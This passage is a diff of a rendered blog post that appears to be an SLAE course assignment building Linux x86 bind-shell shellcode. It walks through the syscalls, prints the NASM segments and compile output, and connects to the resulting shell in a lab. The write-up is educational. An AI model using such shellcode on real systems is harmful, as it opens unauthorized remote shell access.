@@ -73,44 +73,44 @@
      <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="mh">0x00000000</span> <span class="o">=&gt;</span>
          <span class="n">none</span><span class="p">;</span>
 <span class="p">)</span> <span class="o">=</span>  <span class="mi">0</span><span class="p">;</span>
-</code></pre></div> <p>After examining the <code class="highlighter-rouge">linux/x86/shell_bind_tcp</code> payload, it is fairly evident that the ingredients for a bind shell can be broken up in to the following segments:</p> <ul> <li>socket</li> <li>bind</li> <li>listen</li> <li>accept</li> <li>dup2</li> <li>execve</li> </ul> <h3 id="socket">Socket</h3> <p>The first thing to do is identify the system call for sockets, this is <code class="highlighter-rouge">socketcall</code> and has a value of <code class="highlighter-rouge">102</code>.</p> <div class="highlighter-rouge"><pre class="highlight"><code>cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket
-#define __NR_socketcall		102
-</code></pre></div> <p>The arguments required by the <code class="highlighter-rouge">socketcall</code> syscall can then be identified. As seen below, the two arguments that are required are <code class="highlighter-rouge">call</code>, which is the particular function that is going to be invoked, as well as arguments for the <code class="highlighter-rouge">call</code> that is being used.</p> <div class="highlighter-rouge"><pre class="highlight"><code>SYNOPSIS
-       int socketcall(int call, unsigned long *args)
-</code></pre></div> <p>As the creation of a new socket needs to take place, the function that is going to be called by <code class="highlighter-rouge">socketcall</code> is <code class="highlighter-rouge">socket</code>. The <code class="highlighter-rouge">net</code> header file contains the integer that needs to be specified for the <code class="highlighter-rouge">socket</code> function; this is <code class="highlighter-rouge">1</code>.</p> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/libemu/tools/sctest$ cat /usr/include/linux/net.h | grep SOCKET
- * NET		An implementation of the SOCKET network access protocol.
-#define SYS_SOCKET	1		/* sys_socket(2)		*/
-#define SYS_SOCKETPAIR	8		/* sys_socketpair(2)		*/
-skawa@ubuntu:~/libemu/tools/sctest$
-</code></pre></div> <p>Next, the arguments that are required by the <code class="highlighter-rouge">socket</code> function can be looked into.</p> <div class="highlighter-rouge"><pre class="highlight"><code>SYNOPSIS
-       #include &lt;sys/types.h&gt;          /* See NOTES */
-       #include &lt;sys/socket.h&gt;
+</code></pre></div> <p>After examining the <code class="highlighter-rouge">linux/x86/shell_bind_tcp</code> payload, it is fairly evident that the ingredients for a bind shell can be broken up in to the following segments:</p> <ul> <li>socket</li> <li>bind</li> <li>listen</li> <li>accept</li> <li>dup2</li> <li>execve</li> </ul> <h3 id="socket">Socket</h3> <p>The first thing to do is identify the system call for sockets, this is <code class="highlighter-rouge">socketcall</code> and has a value of <code class="highlighter-rouge">102</code>.</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code>cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socket
+<span class="c">#define __NR_socketcall		102</span>
+</code></pre></div> <p>The arguments required by the <code class="highlighter-rouge">socketcall</code> syscall can then be identified. As seen below, the two arguments that are required are <code class="highlighter-rouge">call</code>, which is the particular function that is going to be invoked, as well as arguments for the <code class="highlighter-rouge">call</code> that is being used.</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code>SYNOPSIS
+       int socketcall<span class="o">(</span>int call, unsigned long <span class="k">*</span>args<span class="o">)</span>
+</code></pre></div> <p>As the creation of a new socket needs to take place, the function that is going to be called by <code class="highlighter-rouge">socketcall</code> is <code class="highlighter-rouge">socket</code>. The <code class="highlighter-rouge">net</code> header file contains the integer that needs to be specified for the <code class="highlighter-rouge">socket</code> function; this is <code class="highlighter-rouge">1</code>.</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="gp">skawa@ubuntu:~/libemu/tools/sctest$ </span>cat /usr/include/linux/net.h | grep SOCKET
+ <span class="k">*</span> NET		An implementation of the SOCKET network access protocol.
+<span class="c">#define SYS_SOCKET	1		/* sys_socket(2)		*/</span>
+<span class="c">#define SYS_SOCKETPAIR	8		/* sys_socketpair(2)		*/</span>
+skawa@ubuntu:~/libemu/tools/sctest<span class="err">$</span>
+</code></pre></div> <p>Next, the arguments that are required by the <code class="highlighter-rouge">socket</code> function can be looked into.</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code>SYNOPSIS
+       <span class="c">#include &lt;sys/types.h&gt;          /* See NOTES */</span>
+       <span class="c">#include &lt;sys/socket.h&gt;</span>
 
-       int socket(int domain, int type, int protocol);
-</code></pre></div> <p>The <code class="highlighter-rouge">domain</code> argument requires a communication protocol. After checking the <code class="highlighter-rouge">socket</code> header file, the protocol that needs to be selected is <code class="highlighter-rouge">PF_INET</code>; this is <code class="highlighter-rouge">2</code>.</p> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/libemu/tools/sctest$ cat /usr/include/i386-linux-gnu/bits/socket.h | grep "Protocol families." -A 8
-/* Protocol families.  */
-#define	PF_UNSPEC	0	/* Unspecified.  */
-#define	PF_LOCAL	1	/* Local to host (pipes and file-domain).  */
-#define	PF_UNIX		PF_LOCAL /* POSIX name for PF_LOCAL.  */
-#define	PF_FILE		PF_LOCAL /* Another non-standard name for PF_LOCAL.  */
-#define	PF_INET		2	/* IP protocol family.  */
-#define	PF_AX25		3	/* Amateur Radio AX.25.  */
-#define	PF_IPX		4	/* Novell Internet Protocol.  */
-#define	PF_APPLETALK	5	/* Appletalk DDP.  */
-skawa@ubuntu:~/libemu/tools/sctest$
-</code></pre></div> <p>Next, the <code class="highlighter-rouge">type</code> argument requires a communication type. After checking the <code class="highlighter-rouge">socket</code> header file, the socket type that needs to be selected is <code class="highlighter-rouge">SOCK_STREAM</code>; this is <code class="highlighter-rouge">1</code>.</p> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/libemu/tools/sctest$ cat /usr/include/i386-linux-gnu/bits/socket.h | grep "Types of sockets" -A 7
-/* Types of sockets.  */
+       int socket<span class="o">(</span>int domain, int <span class="nb">type</span>, int protocol<span class="o">)</span>;
+</code></pre></div> <p>The <code class="highlighter-rouge">domain</code> argument requires a communication protocol. After checking the <code class="highlighter-rouge">socket</code> header file, the protocol that needs to be selected is <code class="highlighter-rouge">PF_INET</code>; this is <code class="highlighter-rouge">2</code>.</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="gp">skawa@ubuntu:~/libemu/tools/sctest$ </span>cat /usr/include/i386-linux-gnu/bits/socket.h | grep <span class="s2">"Protocol families."</span> -A 8
+/<span class="k">*</span> Protocol families.  <span class="k">*</span>/
+<span class="c">#define	PF_UNSPEC	0	/* Unspecified.  */</span>
+<span class="c">#define	PF_LOCAL	1	/* Local to host (pipes and file-domain).  */</span>
+<span class="c">#define	PF_UNIX		PF_LOCAL /* POSIX name for PF_LOCAL.  */</span>
+<span class="c">#define	PF_FILE		PF_LOCAL /* Another non-standard name for PF_LOCAL.  */</span>
+<span class="c">#define	PF_INET		2	/* IP protocol family.  */</span>
+<span class="c">#define	PF_AX25		3	/* Amateur Radio AX.25.  */</span>
+<span class="c">#define	PF_IPX		4	/* Novell Internet Protocol.  */</span>
+<span class="c">#define	PF_APPLETALK	5	/* Appletalk DDP.  */</span>
+skawa@ubuntu:~/libemu/tools/sctest<span class="err">$</span>
+</code></pre></div> <p>Next, the <code class="highlighter-rouge">type</code> argument requires a communication type. After checking the <code class="highlighter-rouge">socket</code> header file, the socket type that needs to be selected is <code class="highlighter-rouge">SOCK_STREAM</code>; this is <code class="highlighter-rouge">1</code>.</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="gp">skawa@ubuntu:~/libemu/tools/sctest$ </span>cat /usr/include/i386-linux-gnu/bits/socket.h | grep <span class="s2">"Types of sockets"</span> -A 7
+/<span class="k">*</span> Types of sockets.  <span class="k">*</span>/
 enum __socket_type
-{
-  SOCK_STREAM = 1,		/* Sequenced, reliable, connection-based
-				   byte streams.  */
-#define SOCK_STREAM SOCK_STREAM
-  SOCK_DGRAM = 2,		/* Connectionless, unreliable datagrams
-				   of fixed maximum length.  */
-skawa@ubuntu:~/libemu/tools/sctest$
-</code></pre></div> <p>The <code class="highlighter-rouge">protocol</code> argument needs to set. According to the <code class="highlighter-rouge">socket</code> manual:</p> <div class="highlighter-rouge"><pre class="highlight"><code>The  protocol specifies a particular protocol to be used with the socket. Normally only a single protocol exists to support a particular socket type within a given protocol family, in which case protocol can be specified as 0.
+<span class="o">{</span>
+  SOCK_STREAM <span class="o">=</span> 1,		/<span class="k">*</span> Sequenced, reliable, connection-based
+				   byte streams.  <span class="k">*</span>/
+<span class="c">#define SOCK_STREAM SOCK_STREAM</span>
+  SOCK_DGRAM <span class="o">=</span> 2,		/<span class="k">*</span> Connectionless, unreliable datagrams
+				   of fixed maximum length.  <span class="k">*</span>/
+skawa@ubuntu:~/libemu/tools/sctest<span class="err">$</span>
+</code></pre></div> <p>The <code class="highlighter-rouge">protocol</code> argument needs to set. According to the <code class="highlighter-rouge">socket</code> manual:</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code>The  protocol specifies a particular protocol to be used with the socket. Normally only a single protocol exists to support a particular socket <span class="nb">type </span>within a given protocol family, <span class="k">in </span>which <span class="k">case</span> protocol can be specified as 0.
 </code></pre></div> <p>As such, the value supplied to the <code class="highlighter-rouge">protocol</code> can be set to <code class="highlighter-rouge">0x0</code></p> <p>Having fulfilled the requirements for the <code class="highlighter-rouge">socket</code> function, the socket segment can now be created.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">xor</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">ebx</span> <span class="c">;zero out ebx</span>
-<span class="k">mul</span> <span class="n">ebx</span> <span class="c">;this zero's out eax and edx also</span>
+<span class="k">mul</span> <span class="n">ebx</span> <span class="c">;this zeros out eax and edx also</span>
 
 <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span> <span class="c">;socketcall syscall</span>
 <span class="k">mov</span> <span class="n">bl</span><span class="p">,</span> <span class="mh">0x1</span> <span class="c">;socketcall type, socket</span>
@@ -126,19 +126,19 @@ skawa@ubuntu:~/libemu/tools/sctest$
 
 <span class="k">xchg</span> <span class="n">edx</span><span class="p">,</span> <span class="n">eax</span> <span class="c">;move the return value from the socket syscall into edx for preservation, also zero out eax.</span>
 <span class="k">xor</span> <span class="n">esi</span><span class="p">,</span> <span class="n">esi</span> <span class="c">;clear out esi</span>
-</code></pre></div> <p>One thing to note is that a socket file descriptor is returned to <code class="highlighter-rouge">EAX</code>. It will be important to preserve this for later use.</p> <h3 id="bind">Bind</h3> <p>Bind is a function that is also invoked by <code class="highlighter-rouge">socketcall</code>. The <code class="highlighter-rouge">net</code> header file contains the integer that needs to be specified for the <code class="highlighter-rouge">bind</code> function; this is <code class="highlighter-rouge">2</code>.</p> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment1$ cat /usr/include/linux/net.h | grep -i bind
-#define SYS_BIND	2		/* sys_bind(2)			*/
-skawa@ubuntu:~/Desktop/code/assignment/assignment1$
-</code></pre></div> <p>Next, the arguments that are required by the <code class="highlighter-rouge">bind</code> function can be looked into.</p> <div class="highlighter-rouge"><pre class="highlight"><code>SYNOPSIS
-       #include &lt;sys/types.h&gt;          /* See NOTES */
-       #include &lt;sys/socket.h&gt;
+</code></pre></div> <p>One thing to note is that a socket file descriptor is returned to <code class="highlighter-rouge">EAX</code>. It will be important to preserve this for later use.</p> <h3 id="bind">Bind</h3> <p>Bind is a function that is also invoked by <code class="highlighter-rouge">socketcall</code>. The <code class="highlighter-rouge">net</code> header file contains the integer that needs to be specified for the <code class="highlighter-rouge">bind</code> function; this is <code class="highlighter-rouge">2</code>.</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment1$ </span>cat /usr/include/linux/net.h | grep -i <span class="nb">bind</span>
+<span class="c">#define SYS_BIND	2		/* sys_bind(2)			*/</span>
+skawa@ubuntu:~/Desktop/code/assignment/assignment1<span class="err">$</span>
+</code></pre></div> <p>Next, the arguments that are required by the <code class="highlighter-rouge">bind</code> function can be looked into.</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code>SYNOPSIS
+       <span class="c">#include &lt;sys/types.h&gt;          /* See NOTES */</span>
+       <span class="c">#include &lt;sys/socket.h&gt;</span>
 
-       int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
-</code></pre></div> <p>The <code class="highlighter-rouge">sockfd</code> argument requires the file descriptor returned by a socket creation. This is currently stored in both <code class="highlighter-rouge">EAX</code> and <code class="highlighter-rouge">EDX</code>, however, will be shortly removed from <code class="highlighter-rouge">EAX</code> once the system call is set up.</p> <p>The <code class="highlighter-rouge">*addr</code> argument requires a socket address structure. There are different types of socket address structures, however the one of concern is <code class="highlighter-rouge">sockaddr_in</code>. The components required for this structure are quite simple, the address family, which is <code class="highlighter-rouge">AF_INET</code>, the same as <code class="highlighter-rouge">PF_INET</code>, or <code class="highlighter-rouge">2</code>. The port to bind to, and the IP address to listen on. If the IP address set to <code class="highlighter-rouge">0x0</code>, the <code class="highlighter-rouge">bind</code> will listen on all interfaces.</p> <div class="highlighter-rouge"><pre class="highlight"><code>struct sockaddr_in {
-    sa_family_t    sin_family; /* address family: AF_INET */
-    in_port_t      sin_port;   /* port in network byte order */
-    struct in_addr sin_addr;   /* internet address */
-};
+       int <span class="nb">bind</span><span class="o">(</span>int sockfd, const struct sockaddr <span class="k">*</span>addr, socklen_t addrlen<span class="o">)</span>;
+</code></pre></div> <p>The <code class="highlighter-rouge">sockfd</code> argument requires the file descriptor returned by a socket creation. This is currently stored in both <code class="highlighter-rouge">EAX</code> and <code class="highlighter-rouge">EDX</code>, however, will be shortly removed from <code class="highlighter-rouge">EAX</code> once the system call is set up.</p> <p>The <code class="highlighter-rouge">*addr</code> argument requires a socket address structure. There are different types of socket address structures, however the one of concern is <code class="highlighter-rouge">sockaddr_in</code>. The components required for this structure are quite simple, the address family, which is <code class="highlighter-rouge">AF_INET</code>, the same as <code class="highlighter-rouge">PF_INET</code>, or <code class="highlighter-rouge">2</code>. The port to bind to, and the IP address to listen on. If the IP address set to <code class="highlighter-rouge">0x0</code>, the <code class="highlighter-rouge">bind</code> will listen on all interfaces.</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code>struct sockaddr_in <span class="o">{</span>
+    sa_family_t    sin_family; /<span class="k">*</span> address family: AF_INET <span class="k">*</span>/
+    in_port_t      sin_port;   /<span class="k">*</span> port <span class="k">in </span>network byte order <span class="k">*</span>/
+    struct in_addr sin_addr;   /<span class="k">*</span> internet address <span class="k">*</span>/
+<span class="o">}</span>;
 </code></pre></div> <p>The <code class="highlighter-rouge">addrlen</code> argument requires the size of the struct in bytes.</p> <p>Having fulfilled the requirements for the <code class="highlighter-rouge">bind</code> function, the bind segment can now be created.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span> <span class="c">;socketcall syscall</span>
 <span class="k">inc</span> <span class="n">bl</span> <span class="c">;ebx contains 2, for the type of socketcall, which is bind</span>
 
@@ -153,16 +153,16 @@ skawa@ubuntu:~/Desktop/code/assignment/assignment1$
 <span class="k">push</span> <span class="n">ecx</span> <span class="c">;the stack pointer to the sockaddr_in structure pushed on to the stack</span>
 <span class="k">push</span> <span class="n">edx</span><span class="c">; push bind sockfd to the stack, this is the value of the file descriptor returned to socket</span>
 
-<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span> <span class="c">;update ecx to the stack pointer which currently contains a pointer to "sockfd, sockaddr_in, addrlen. All arguments for bind, as required by socketcall are pointed to by ECX</span>
+<span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span> <span class="c">;update ecx to the stack pointer which currently contains a pointer to sockfd, sockaddr_in, addrlen. All arguments for bind, as required by socketcall are pointed to by ECX</span>
 <span class="k">int</span> <span class="mh">0x80</span>  <span class="c">;execute bind syscall</span>
-</code></pre></div> <h3 id="listen">Listen</h3> <p>Listen is a function that is also invoked by <code class="highlighter-rouge">socketcall</code>. The <code class="highlighter-rouge">net</code> header file contains the integer that needs to be specified for the <code class="highlighter-rouge">listen</code> function; this is <code class="highlighter-rouge">4</code>.</p> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment1$ cat /usr/include/linux/net.h | grep LISTEN
-#define SYS_LISTEN	4		/* sys_listen(2)		*/
-skawa@ubuntu:~/Desktop/code/assignment/assignment1$
-</code></pre></div> <p>Next, the arguments that are required by the <code class="highlighter-rouge">listen</code> function can be looked into.</p> <div class="highlighter-rouge"><pre class="highlight"><code>SYNOPSIS
-       #include &lt;sys/types.h&gt;          /* See NOTES */
-       #include &lt;sys/socket.h&gt;
+</code></pre></div> <h3 id="listen">Listen</h3> <p>Listen is a function that is also invoked by <code class="highlighter-rouge">socketcall</code>. The <code class="highlighter-rouge">net</code> header file contains the integer that needs to be specified for the <code class="highlighter-rouge">listen</code> function; this is <code class="highlighter-rouge">4</code>.</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment1$ </span>cat /usr/include/linux/net.h | grep LISTEN
+<span class="c">#define SYS_LISTEN	4		/* sys_listen(2)		*/</span>
+skawa@ubuntu:~/Desktop/code/assignment/assignment1<span class="err">$</span>
+</code></pre></div> <p>Next, the arguments that are required by the <code class="highlighter-rouge">listen</code> function can be looked into.</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code>SYNOPSIS
+       <span class="c">#include &lt;sys/types.h&gt;          /* See NOTES */</span>
+       <span class="c">#include &lt;sys/socket.h&gt;</span>
 
-       int listen(int sockfd, int backlog);
+       int listen<span class="o">(</span>int sockfd, int backlog<span class="o">)</span>;
 </code></pre></div> <p>The <code class="highlighter-rouge">sockfd</code> argument requires the file descriptor returned by a socket creation. This is currently stored in <code class="highlighter-rouge">EDX</code>.</p> <p>The <code class="highlighter-rouge">backlog</code> argument requires the maximum length to which the queue of pending connections for <code class="highlighter-rouge">sockfd</code> may grow. This can be set to <code class="highlighter-rouge">0</code>.</p> <p>Having fulfilled the requirements for the <code class="highlighter-rouge">listen</code> function, the listen segment can now be created.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span> <span class="c">;socketcall syscall</span>
 <span class="k">add</span> <span class="n">bl</span><span class="p">,</span> <span class="mh">0x2</span> <span class="c">;ebx contains 4, for the type of socketcall, which is listen</span>
 
@@ -172,16 +172,16 @@ skawa@ubuntu:~/Desktop/code/assignment/assignment1$
 
 <span class="k">mov</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">esp</span>  <span class="c">;all arguments for listen, as required by socketcall are pointed to by ECX</span>
 <span class="k">int</span> <span class="mh">0x80</span>  <span class="c">;execute listen syscall</span>
-</code></pre></div> <h3 id="accept">Accept</h3> <p>Accept is a function that is also invoked by <code class="highlighter-rouge">socketcall</code>. The <code class="highlighter-rouge">net</code> header file contains the integer that needs to be specified for the <code class="highlighter-rouge">accept</code> function; this is <code class="highlighter-rouge">5</code>.</p> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment1$ cat /usr/include/linux/net.h | grep ACCEPT
-#define SYS_ACCEPT	5		/* sys_accept(2)		*/
-#define SYS_ACCEPT4	18		/* sys_accept4(2)		*/
-#define __SO_ACCEPTCON	(1 &lt;&lt; 16)	/* performed a listen		*/
-skawa@ubuntu:~/Desktop/code/assignment/assignment1$
-</code></pre></div> <p>Next, the arguments that are required by the <code class="highlighter-rouge">accept</code> function can be looked into.</p> <div class="highlighter-rouge"><pre class="highlight"><code>SYNOPSIS
-       #include &lt;sys/types.h&gt;          /* See NOTES */
-       #include &lt;sys/socket.h&gt;
+</code></pre></div> <h3 id="accept">Accept</h3> <p>Accept is a function that is also invoked by <code class="highlighter-rouge">socketcall</code>. The <code class="highlighter-rouge">net</code> header file contains the integer that needs to be specified for the <code class="highlighter-rouge">accept</code> function; this is <code class="highlighter-rouge">5</code>.</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment1$ </span>cat /usr/include/linux/net.h | grep ACCEPT
+<span class="c">#define SYS_ACCEPT	5		/* sys_accept(2)		*/</span>
+<span class="c">#define SYS_ACCEPT4	18		/* sys_accept4(2)		*/</span>
+<span class="c">#define __SO_ACCEPTCON	(1 &lt;&lt; 16)	/* performed a listen		*/</span>
+skawa@ubuntu:~/Desktop/code/assignment/assignment1<span class="err">$</span>
+</code></pre></div> <p>Next, the arguments that are required by the <code class="highlighter-rouge">accept</code> function can be looked into.</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code>SYNOPSIS
+       <span class="c">#include &lt;sys/types.h&gt;          /* See NOTES */</span>
+       <span class="c">#include &lt;sys/socket.h&gt;</span>
 
-       int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
+       int accept<span class="o">(</span>int sockfd, struct sockaddr <span class="k">*</span>addr, socklen_t <span class="k">*</span>addrlen<span class="o">)</span>;
 </code></pre></div> <p>The <code class="highlighter-rouge">accept</code> function is required to accept any incoming connections by clients. As client related information is unknown and does not need to be restricted it does not need to be populated with meaningful data.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mh">0x66</span> <span class="c">;socketcall syscall</span>
 <span class="k">inc</span> <span class="n">bl</span> <span class="c">;ebx contains 5, for the type of socketcall, which is accept</span>
 
@@ -194,16 +194,16 @@ skawa@ubuntu:~/Desktop/code/assignment/assignment1$
 <span class="k">int</span> <span class="mh">0x80</span>  <span class="c">;execute accept syscall</span>
 
 <span class="k">mov</span> <span class="n">edx</span><span class="p">,</span> <span class="n">eax</span> <span class="c">;move the return value from the accept syscall into EDX for preservation.</span>
-</code></pre></div> <p>One thing to note is that a client socket file descriptor is returned to <code class="highlighter-rouge">EAX</code>. It will be important to preserve this for later use.</p> <h3 id="duplicate-file-descriptor">Duplicate File Descriptor</h3> <p>Using the duplicate file descriptor, it will be possible to to redirect/duplicate STDIN(0), STDOUT(1) and STDERR(2) through the client socket file descriptor. Doing this makes the shell observable.</p> <p>The first thing to do is identify the system call for <code class="highlighter-rouge">dup2</code>, this is <code class="highlighter-rouge">63</code>.</p> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment1$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup
-#define __NR_dup		 41
-#define __NR_dup2		 63
-#define __NR_dup3		330
-skawa@ubuntu:~/Desktop/code/assignment/assignment1$
-</code></pre></div> <p>The arguments required by the <code class="highlighter-rouge">dup2</code> syscall can then be identified. As seen below, the two arguments that are required are <code class="highlighter-rouge">oldfd</code> and <code class="highlighter-rouge">newfd</code>.</p> <div class="highlighter-rouge"><pre class="highlight"><code>SYNOPSIS
-       #include &lt;unistd.h&gt;
+</code></pre></div> <p>One thing to note is that a client socket file descriptor is returned to <code class="highlighter-rouge">EAX</code>. It will be important to preserve this for later use.</p> <h3 id="duplicate-file-descriptor">Duplicate File Descriptor</h3> <p>Using the duplicate file descriptor, it will be possible to to redirect/duplicate STDIN(0), STDOUT(1) and STDERR(2) through the client socket file descriptor. Doing this makes the shell observable.</p> <p>The first thing to do is identify the system call for <code class="highlighter-rouge">dup2</code>, this is <code class="highlighter-rouge">63</code>.</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment1$ </span>cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup
+<span class="c">#define __NR_dup		 41</span>
+<span class="c">#define __NR_dup2		 63</span>
+<span class="c">#define __NR_dup3		330</span>
+skawa@ubuntu:~/Desktop/code/assignment/assignment1<span class="err">$</span>
+</code></pre></div> <p>The arguments required by the <code class="highlighter-rouge">dup2</code> syscall can then be identified. As seen below, the two arguments that are required are <code class="highlighter-rouge">oldfd</code> and <code class="highlighter-rouge">newfd</code>.</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code>SYNOPSIS
+       <span class="c">#include &lt;unistd.h&gt;</span>
 
-       int dup(int oldfd);
-       int dup2(int oldfd, int newfd);
+       int dup<span class="o">(</span>int oldfd<span class="o">)</span>;
+       int dup2<span class="o">(</span>int oldfd, int newfd<span class="o">)</span>;
 </code></pre></div> <p>The <code class="highlighter-rouge">oldfd</code> argument will contain the client socket file descriptor, which is currently in the <code class="highlighter-rouge">EDX</code> register.</p> <p>The <code class="highlighter-rouge">newfd</code> argument will contain the value for STDIN(0), STDOUT(1) and STDERR(2). The way this is achieved is through a loop that takes advantage of the signed flag. Once the value in <code class="highlighter-rouge">ECX</code> has been exhausted, the signed flag will be set, thus permitting the exit of the loop.</p> <div class="language-nasm highlighter-rouge"><pre class="highlight"><code><span class="c">;dup2</span>
 <span class="k">mov</span> <span class="n">ebx</span><span class="p">,</span> <span class="n">edx</span> <span class="c">;move the client socket file descriptor into EBX to satisfy the oldf2 argument for dup2</span>
 <span class="k">xor</span> <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>  <span class="c">;clear out ecx</span>
@@ -237,37 +237,37 @@ skawa@ubuntu:~/Desktop/code/assignment/assignment1$
 
 <span class="k">mov</span> <span class="n">al</span><span class="p">,</span> <span class="mi">11</span>     <span class="c">;execve syscall number, 0xb works also.</span>
 <span class="k">int</span> <span class="mh">0x80</span>       <span class="c">;initiate</span>
-</code></pre></div> <h3 id="testing-execution">Testing Execution</h3> <p>I built on top of <a href="https://twitter.com/SecurityTube">Vivek’s</a> nasm linker and assembler shell script and added the opcode extractor and C compiler used in the SLAE course. You can find <code class="highlighter-rouge">super-compile.sh</code> <a href="https://github.com/skahwah/slae/blob/master/super-compile.sh">here</a>.</p> <div class="highlighter-rouge"><pre class="highlight"><code>skawa@ubuntu:~/Desktop/code/assignment/assignment1$ ls
+</code></pre></div> <h3 id="testing-execution">Testing Execution</h3> <p>I built on top of <a href="https://twitter.com/SecurityTube">Vivek's</a> nasm linker and assembler shell script and added the opcode extractor and C compiler used in the SLAE course. You can find <code class="highlighter-rouge">super-compile.sh</code> <a href="https://github.com/skahwah/slae/blob/master/super-compile.sh">here</a>.</p> <div class="language-bash highlighter-rouge"><pre class="highlight"><code><span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment1$ </span>ls
 bind.nasm  super-compile.sh
-skawa@ubuntu:~/Desktop/code/assignment/assignment1$ ./super-compile.sh bind
-[+] Assembling with Nasm
-[+] Linking
-[+] Extracting Opcodes
-[+] Creating Shellcode
-[+] Compiling Shellcode
-[+] Done!
-skawa@ubuntu:~/Desktop/code/assignment/assignment1$ ls
-bind  bind.nasm  bind.o  shellcode-bind  shellcode-bind.c  super-compile.sh
-skawa@ubuntu:~/Desktop/code/assignment/assignment1$ ./shellcode-bind
+<span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment1$ </span>./super-compile.sh <span class="nb">bind</span>
+<span class="o">[</span>+] Assembling with Nasm
+<span class="o">[</span>+] Linking
+<span class="o">[</span>+] Extracting Opcodes
+<span class="o">[</span>+] Creating Shellcode
+<span class="o">[</span>+] Compiling Shellcode
+<span class="o">[</span>+] Done!
+<span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment1$ </span>ls
+<span class="nb">bind  </span>bind.nasm  bind.o  shellcode-bind  shellcode-bind.c  super-compile.sh
+<span class="gp">skawa@ubuntu:~/Desktop/code/assignment/assignment1$ </span>./shellcode-bind
 Shellcode Length: 103
 
-</code></pre></div> <h4 id="connecting">Connecting</h4> <div class="highlighter-rouge"><pre class="highlight"><code>19:04 skawa@skawa-mbp: ~ $ nc -nv 192.168.156.156 3879
+</code></pre></div> <h4 id="connecting">Connecting</h4> <div class="language-bash highlighter-rouge"><pre class="highlight"><code>19:04 skawa@skawa-mbp: ~ <span class="nv">$ </span>nc -nv 192.168.156.156 3879
 found 0 associations
 found 1 connections:
-     1:	flags=82&lt;CONNECTED,PREFERRED&gt;
+     1:	<span class="nv">flags</span><span class="o">=</span>82&lt;CONNECTED,PREFERRED&gt;
 	outif vmnet8
 	src 192.168.156.1 port 50727
 	dst 192.168.156.156 port 3879
 	rank info not available
 	TCP aux info available
 
-Connection to 192.168.156.156 port 3879 [tcp/*] succeeded!
+Connection to 192.168.156.156 port 3879 <span class="o">[</span>tcp/<span class="k">*</span><span class="o">]</span> succeeded!
 uname -a
-Linux ubuntu 3.8.0-29-generic #42~precise1-Ubuntu SMP Wed Aug 14 15:31:16 UTC 2013 i686 i686 i386 GNU/Linux
+Linux ubuntu 3.8.0-29-generic <span class="c">#42~precise1-Ubuntu SMP Wed Aug 14 15:31:16 UTC 2013 i686 i686 i386 GNU/Linux</span>
 whoami
 skawa
 ^C
-19:05 skawa@skawa-mbp: ~ $
+19:05 skawa@skawa-mbp: ~ <span class="err">$</span>
 </code></pre></div> <h4 id="wrapper">Wrapper</h4> <p>For ease of configuration, I have put together a script that takes user supplied network information and converts it to hexadecimal. This can be found <a href="https://github.com/skahwah/slae/blob/master/assignment1/networkhex.rb">here</a>. The IP address is irrelevant for this particular case.</p> <div class="language-ruby highlighter-rouge"><pre class="highlight"><code><span class="mi">08</span><span class="p">:</span><span class="mi">25</span> <span class="n">skawa</span><span class="vi">@skawa</span><span class="o">-</span><span class="ss">mbp: </span><span class="no">Desktop</span> <span class="err">$</span> <span class="n">ruby</span> <span class="n">networkhex</span><span class="p">.</span><span class="nf">rb</span>
